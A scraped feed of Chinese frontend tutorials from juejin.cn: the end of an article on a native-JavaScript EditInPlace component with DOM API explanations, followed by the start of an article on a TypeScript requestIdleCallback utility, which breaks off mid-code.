<li>页面上显示一行文字：“有了肯德基，生活好滋味”</li>
<li>点击这行字 → 出现一个输入框，里面是同样的文字，旁边有“保存”和“取消”按钮</li>
<li>修改文字后点击“保存” → 文字更新；点击“取消” → 恢复原样</li>
</ul>
<hr/>
<h2 data-id="heading-11">五、本例中使用的所有 DOM 操作方法详解</h2>
<p>在 <code>EditInPlace</code> 类的实现中，我们用到了多个原生 JavaScript 的 DOM（文档对象模型）操作方法。下面将它们集中整理并逐个解释，帮助新手彻底理解这些 API 的作用和用法。</p>
<blockquote>
<p>📌 <strong>DOM 是什么？</strong><br/>
DOM（Document Object Model）是浏览器将 HTML 文档解析成的一棵“树”，每个标签都是一个“节点”（Node）。JavaScript 可以通过 DOM API 增删改查这些节点，从而动态控制网页内容。</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">5.1 <code>document.createElement(tagName)</code></h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">div</span> = document.createElement(<span class="hljs-string">'div'</span>)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li><strong>作用</strong>：在内存中创建一个新的 HTML 元素节点（不显示在页面上）。</li>
<li><strong>参数</strong>：<code>tagName</code> 是标签名，如 <code>'div'</code>、<code>'span'</code>、<code>'input'</code>。</li>
<li><strong>返回值</strong>：一个 HTMLElement 对象（如 HTMLDivElement）。</li>
<li><strong>注意</strong>：此时元素尚未挂载到页面，需后续用 <code>appendChild</code> 添加。</li>
</ul>
<p><strong>用途</strong>：构建组件的内部结构（容器、输入框、按钮等）。</p>
<hr/>
<h3 data-id="heading-13">5.2 <code>element.appendChild(childElement)</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">this</span>.containerElement.appendChild(<span class="hljs-keyword">this</span>.staticElement);
</code></pre>
<ul>
<li><strong>作用</strong>：将一个子节点添加到父节点的末尾。</li>
<li><strong>参数</strong>：<code>childElement</code> 是通过 <code>createElement</code> 创建的元素。</li>
<li><strong>效果</strong>：元素被插入到真实 DOM 树中，用户可见。</li>
</ul>
<p>✅ <strong>用途</strong>：组装组件结构，最终将整个编辑器挂载到页面。</p>
<hr/>
<h3 data-id="heading-14">5.3 <code>element.innerHTML</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">this</span>.staticElement.innerHTML = <span class="hljs-keyword">this</span>.value;
</code></pre>
<ul>
<li>
<p><strong>作用</strong>：设置或获取元素内部的 HTML 内容。</p>
</li>
<li>
<p><strong>特点</strong>：</p>
<ul>
<li>可解析 HTML 标签（如 <code>&lt;b&gt;加粗&lt;/b&gt;</code> 会生效）；</li>
<li>若只处理纯文本，建议使用 <code>textContent</code>（更安全）。</li>
</ul>
</li>
<li>
<p><strong>本例用途</strong>：将字符串（如“点击我编辑”）显示在 <code>&lt;span&gt;</code> 中。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-15">5.4 <code>element.style.display</code></h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">this.fieldElement.style.display</span> = <span class="hljs-string">'none'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">this.staticElement.style.display</span> = <span class="hljs-string">'inline'</span><span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>
<p><strong>作用</strong>：控制元素的显示与隐藏。</p>
</li>
<li>
<p><strong>常用值</strong>：</p>
<ul>
<li><code>'none'</code>：完全隐藏，不占空间；</li>
<li><code>'block'</code>：块级显示（如 div）；</li>
<li><code>'inline'</code>：行内显示（如 span、input）；</li>
<li><code>'inline-block'</code>：行内块（兼顾宽高和同行排列）。</li>
</ul>
</li>
<li>
<p><strong>本例用途</strong>：在“文本状态”和“编辑状态”之间切换 UI。</p>
</li>
</ul>
<p>✅ <strong>优势</strong>：简单直接，适合小型交互。</p>
<hr/>
<h3 data-id="heading-16">5.5 <code>element.addEventListener(eventType, handler)</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">this</span>.staticElement.addEventListener(<span class="hljs-string">'click'</span>, () =&gt; {
    <span class="hljs-keyword">this</span>.convertToField();
});
</code></pre>
<ul>
<li>
<p><strong>作用</strong>：为元素绑定事件监听器。</p>
</li>
<li>
<p><strong>参数</strong>：</p>
<ul>
<li><code>eventType</code>：事件类型，如 <code>'click'</code>、<code>'input'</code>、<code>'keydown'</code>；</li>
<li><code>handler</code>：回调函数，事件触发时执行。</li>
</ul>
</li>
<li>
<p><strong>本例用途</strong>：</p>
<ul>
<li>点击文本 → 进入编辑；</li>
<li>点击按钮 → 保存或取消。</li>
</ul>
</li>
</ul>
<p>💡 <strong>关键技巧</strong>：使用箭头函数 <code>() =&gt; {}</code> 可确保 <code>this</code> 指向 <code>EditInPlace</code> 实例，而非触发事件的 DOM 元素。</p>
<hr/>
<h3 data-id="heading-17">5.6 <code>element.id = id</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">this</span>.containerElement.id = <span class="hljs-keyword">this</span>.id;
</code></pre>
<ul>
<li>
<p><strong>作用</strong>：设置元素的 <code>id</code> 属性。</p>
</li>
<li>
<p><strong>用途</strong>：</p>
<ul>
<li>方便 CSS 样式定位；</li>
<li>便于调试（在开发者工具中快速查找）；</li>
<li>确保多个实例 ID 不冲突（由用户传入唯一 ID）。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-18">5.7 <code>input.value</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">this</span>.fieldElement.value = <span class="hljs-keyword">this</span>.value;
<span class="hljs-keyword">var</span> value = <span class="hljs-keyword">this</span>.fieldElement.value;
</code></pre>
<ul>
<li>
<p><strong>作用</strong>：获取或设置 <code>&lt;input&gt;</code> 或 <code>&lt;textarea&gt;</code> 的当前值。</p>
</li>
<li>
<p><strong>注意</strong>：这是<strong>属性（property）</strong> ，不是 <code>getAttribute('value')</code>（那是初始值）。</p>
</li>
<li>
<p><strong>本例用途</strong>：</p>
<ul>
<li>初始化输入框内容；</li>
<li>读取用户修改后的新值。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-19">DOM 操作全景图</h3>













































<table><thead><tr><th>方法 / 属性</th><th>用途</th><th>是否改变页面</th></tr></thead><tbody><tr><td><code>createElement</code></td><td>创建元素（内存中）</td><td>❌</td></tr><tr><td><code>appendChild</code></td><td>插入元素到页面</td><td>✅</td></tr><tr><td><code>innerHTML</code></td><td>设置元素内容</td><td>✅</td></tr><tr><td><code>style.display</code></td><td>控制显隐</td><td>✅</td></tr><tr><td><code>addEventListener</code></td><td>绑定交互行为</td><td>—（响应式）</td></tr><tr><td><code>element.id</code></td><td>设置唯一标识</td><td>✅</td></tr><tr><td><code>input.value</code></td><td>读写输入值</td><td>—（数据层）</td></tr></tbody></table>
<p>掌握这些基础 DOM API，你就具备了<strong>用原生 JavaScript 构建动态交互组件的能力</strong>，无需依赖任何框架！</p>
<hr/>
<h2 data-id="heading-20">六、常见问题解答</h2>
<h3 data-id="heading-21">Q1：为什么不用 <code>class</code> 语法？</h3>
<p>A：这道题考察的是 <strong>原型链和构造函数</strong> 的理解。ES6 的 <code>class</code> 本质仍是基于原型的语法糖。掌握底层机制更重要。</p>
<h3 data-id="heading-22">Q2：<code>this</code> 为什么会指向实例？</h3>
<p>A：因为用了 <code>new</code> 关键字。<code>new</code> 会自动创建对象并绑定 <code>this</code>。</p>
<h3 data-id="heading-23">Q3：能不能多个编辑器共存？</h3>
<p>A：完全可以！每个实例都有自己的 <code>id</code>、<code>value</code> 和 DOM 元素，彼此隔离。</p>
<h3 data-id="heading-24">Q4：如何支持多行文本？</h3>
<p>A：把 <code>input</code> 换成 <code>textarea</code>，并调整样式即可。这是很好的扩展练习！</p>
<hr/>
<h2 data-id="heading-25">为什么这是 OOP 的典范？</h2>

































<table><thead><tr><th>关键词</th><th>本例体现</th></tr></thead><tbody><tr><td><strong>封装</strong></td><td>所有逻辑藏在类内部，外部只需 <code>new EditInPlace(...)</code> 即可使用</td></tr><tr><td><strong>复用</strong></td><td>可在多个地方创建多个实例，互不影响</td></tr><tr><td><strong>模块化</strong></td><td>整个类在一个文件中，独立、可移植</td></tr><tr><td><strong>隐藏实现细节</strong></td><td>用户不需要知道 DOM 如何操作，只需调用即可</td></tr><tr><td><strong>编写注释</strong></td><td>函数开头有 JSDoc 注释，说明参数和用途</td></tr><tr><td><strong>拿来就用</strong></td><td>类的使用者和编写者可以是不同人</td></tr></tbody></table>
<blockquote>
<p> <strong>OOP 核心思想</strong>：把“数据”和“操作数据的方法”打包在一起，形成一个独立的对象。</p>
</blockquote>
<hr/>
<p>当然可以！以下是为你的博客文章量身打造的一段<strong>生动有趣、鼓舞人心又带点幽默感</strong>的结语，既呼应全文主题，又能让读者会心一笑、印象深刻：</p>
<hr/>
<h2 data-id="heading-26">结语：你写的不是代码，是“魔法盒子”</h2>
<p>恭喜你！<br/>
走到这里，你已经亲手打造了一个会“变身”的小精灵——点一下变输入框，再点一下变回文字，还能记住你说过的话。它不靠框架，不靠魔法咒语，只靠一行行清晰、封装良好的 JavaScript 代码。</p>
<p>这，就是面向对象编程的魅力：<br/>
<strong>把复杂藏起来，把简单交出去。</strong></p>
<p>未来的你，可能会用 React 写组件，用 Vue 做响应式，甚至让 AI 自动生成代码。但请永远记得今天这个小小的 <code>EditInPlace</code>——它教会你的不是“怎么写”，而是“<strong>怎么想</strong>”。</p>
<p>当你能像搭积木一样，把功能封装成独立、可复用、有名字的“盒子”，你就不再是代码搬运工，而是<strong>用户体验的建筑师</strong>、<strong>交互逻辑的导演</strong>，甚至是<strong>产品灵魂的塑造者</strong>。</p>
<p>世界正等着被你“就地编辑”得更美好 🌟</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[利用requestIdleCallback优化Dom的更新性能]]></title>    <link>https://juejin.cn/post/7579904059525431322</link>    <guid>https://juejin.cn/post/7579904059525431322</guid>    <pubDate>2025-12-05T02:49:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579904059525431322" data-draft-id="7579889969986093107" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="利用requestIdleCallback优化Dom的更新性能"/> <meta itemprop="keywords" content="前端,TypeScript,性能优化"/> <meta itemprop="datePublished" content="2025-12-05T02:49:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="时7"/> <meta itemprop="url" content="https://juejin.cn/user/3450681714038359"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            利用requestIdleCallback优化Dom的更新性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3450681714038359/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    时7
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:49:16.000Z" title="Fri Dec 05 2025 02:49:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">概述</h2>
<p>​requestIdleCallback​ 是一个浏览器 API，允许在浏览器空闲时执行非关键任务，不会阻塞主线程。这对于提升用户体验和性能非常重要，特别是在处理大量 DOM 更新时。</p>
<h2 data-id="heading-1">实现</h2>
<h3 data-id="heading-2">1. 工具函数 (idleCallback.ts​)</h3>
<p>创建一个完整的 requestIdleCallback​ 工具库，包括：</p>
<ul>
<li>​requestIdleCallback​: 在浏览器空闲时执行回调</li>
<li>​cancelIdleCallback​: 取消之前调度的回调</li>
<li>​IdleTaskQueue​: 批量处理任务的队列类</li>
</ul>
<h4 data-id="heading-3">特性</h4>
<ul>
<li>✅ 自动降级: 对于不支持 requestIdleCallback​ 的浏览器，自动降级为 setTimeout​ + MessageChannel​</li>
<li>✅ 超时保护: 支持超时配置，确保任务最终会被执行</li>
<li>✅ 批量处理: IdleTaskQueue​ 可以在空闲时间内批量处理多个任务</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * requestIdleCallback 工具函数
 * 在浏览器空闲时执行回调，不会阻塞主线程
 * 提供降级方案以支持不支持 requestIdleCallback 的浏览器
 */</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IdleCallbackOptions</span> {
  timeout?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 超时时间（毫秒），如果指定，回调会在超时后强制执行</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IdleDeadline</span> {
  <span class="hljs-attr">didTimeout</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 是否因为超时而执行</span>
  <span class="hljs-title function_">timeRemaining</span>(): <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 返回当前空闲时间（毫秒）</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">IdleCallbackHandle</span> = <span class="hljs-built_in">number</span>;

<span class="hljs-comment">/**
 * 在浏览器空闲时执行回调
 * <span class="hljs-doctag">@param</span> callback 要执行的回调函数
 * <span class="hljs-doctag">@param</span> options 配置选项
 * <span class="hljs-doctag">@returns</span> 请求 ID，可用于取消
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> requestIdleCallback = (
  <span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">deadline: IdleDeadline</span>) =&gt;</span> <span class="hljs-built_in">void</span>,
  options?: <span class="hljs-title class_">IdleCallbackOptions</span>
): <span class="hljs-function"><span class="hljs-params">IdleCallbackHandle</span> =&gt;</span> {
  <span class="hljs-comment">// 如果浏览器支持原生 requestIdleCallback，直接使用</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> &amp;&amp; <span class="hljs-string">'requestIdleCallback'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">requestIdleCallback</span>(callback, options);
  }

  <span class="hljs-comment">// 降级方案：使用 setTimeout 模拟</span>
  <span class="hljs-comment">// 使用 1ms 延迟，让浏览器有机会处理其他任务</span>
  <span class="hljs-keyword">const</span> timeout = options?.<span class="hljs-property">timeout</span> ?? <span class="hljs-number">5000</span>; <span class="hljs-comment">// 默认 5 秒超时</span>
  <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

  <span class="hljs-keyword">const</span> timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>({
      <span class="hljs-attr">didTimeout</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">timeRemaining</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span> - (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime)),
    });
  }, timeout);

  <span class="hljs-comment">// 使用 MessageChannel 实现更接近 requestIdleCallback 的行为</span>
  <span class="hljs-comment">// MessageChannel 会在当前任务完成后、下一个任务之前执行</span>
  <span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();
  channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-built_in">clearTimeout</span>(timeoutId);
    <span class="hljs-title function_">callback</span>({
      <span class="hljs-attr">didTimeout</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">timeRemaining</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span> - (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime)),
    });
  };
  channel.<span class="hljs-property">port2</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 返回一个可以用于取消的 ID</span>
  <span class="hljs-keyword">return</span> timeoutId <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">IdleCallbackHandle</span>;
};

<span class="hljs-comment">/**
 * 取消之前通过 requestIdleCallback 调度的回调
 * <span class="hljs-doctag">@param</span> handle 之前返回的请求 ID
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> cancelIdleCallback = (<span class="hljs-attr">handle</span>: <span class="hljs-title class_">IdleCallbackHandle</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> &amp;&amp; <span class="hljs-string">'cancelIdleCallback'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">cancelIdleCallback</span>(handle);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 降级方案：清除 setTimeout</span>
    <span class="hljs-built_in">clearTimeout</span>(handle <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>);
  }
};

<span class="hljs-comment">/**
 * 批量执行任务，在空闲时逐个处理
 * 适用于需要处理大量非关键任务的场景
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdleTaskQueue</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">tasks</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>&gt; = [];
  <span class="hljs-keyword">private</span> isProcessing = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">currentHandle</span>: <span class="hljs-title class_">IdleCallbackHandle</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

  <span class="hljs-comment">/**
   * 添加任务到队列
   */</span>
  <span class="hljs-title function_">add</span>(<span class="hljs-attr">task</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">push</span>(task);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">process</span>();
  }

  <span class="hljs-comment">/**
   * 批量添加任务
   */</span>
  <span class="hljs-title function_">addBatch</span>(<span class="hljs-attr">tasks</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>&gt;): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">push</span>(...tasks);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">process</span>();
  }

  <span class="hljs-comment">/**
   * 处理队列中的任务
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">process</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentHandle</span> = <span class="hljs-title function_">requestIdleCallback</span>(
      <span class="hljs-function">(<span class="hljs-params">deadline</span>) =&gt;</span> {
        <span class="hljs-comment">// 在空闲时间内尽可能多地处理任务</span>
        <span class="hljs-keyword">while</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
          <span class="hljs-keyword">const</span> task = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">shift</span>();
          <span class="hljs-keyword">if</span> (task) {
            <span class="hljs-keyword">try</span> {
              <span class="hljs-title function_">task</span>();
            } <span class="hljs-keyword">catch</span> (error) {
              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'IdleTaskQueue task error:'</span>, error);
            }
          }
        }

        <span class="hljs-comment">// 如果还有任务未处理，继续调度</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
